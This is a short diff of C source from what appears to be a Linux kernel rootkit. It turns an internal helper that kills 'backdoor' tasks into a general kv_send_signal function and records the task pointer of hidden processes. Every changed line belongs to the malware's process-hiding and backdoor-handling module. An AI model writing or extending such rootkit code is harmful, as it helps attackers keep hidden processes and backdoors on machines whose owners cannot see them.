@@ -113,16 +113,6 @@ static void _cleanup_node_list(struct task_struct *task)
 	}
 }
 
-/*
- * If the task being unhidden is a backdoor, it must be terminated to ensure
- * there are no lingering backdoors left active.
- */
-static inline void _kill_task(struct task_struct *task)
-{
-	if (!send_sig(SIGKILL, task, 0) == 0)
-		prerr("kill failed for task %p\n", task);
-}
-
 static int _unhide_task(void *data)
 {
 	struct task_struct *task;
@@ -302,6 +292,17 @@ out:
 #endif
 }
 
+/*
+ * If the task being unhidden is a backdoor, it must be terminated to ensure
+ * there are no lingering backdoors left active.
+ */
+void kv_send_signal(int sig, struct task_struct *task)
+{
+	prinfo("send sig %d to %p\n", sig, task);
+	if (!send_sig(sig, task, 0) == 0)
+		prerr("kill failed for task %p\n", task);
+}
+
 void kv_reload_hidden_task(struct task_struct *task)
 {
 	struct reload_hidden *reload =
@@ -326,6 +327,7 @@ bool kv_find_hidden_pid(struct hidden_status *status, pid_t pid)
 		if (status) {
 			status->hidden = true;
 			status->saddr = node->saddr;
+			status->task = node->task;
 		}
 		return true;
 	}
@@ -398,7 +400,7 @@ void kv_unhide_task_by_pid_exit_group(pid_t pid)
 		task = node->task;
 		_cleanup_node(&node);
 
-		_kill_task(task);
+		kv_send_signal(SIGKILL, task);
 #ifdef DEBUG_RING_BUFFER
 		--ht_num;
 #endif
@@ -431,7 +433,7 @@ void kv_pid_cleanup(void)
 
 		prinfo("cleaning [%p] %s : %d\n", task, task->comm, task->pid);
 		_cleanup_node(&node);
-		_kill_task(task);
+		kv_send_signal(SIGKILL, task);
 #ifdef DEBUG_RING_BUFFER
 		--ht_num;
 #endif
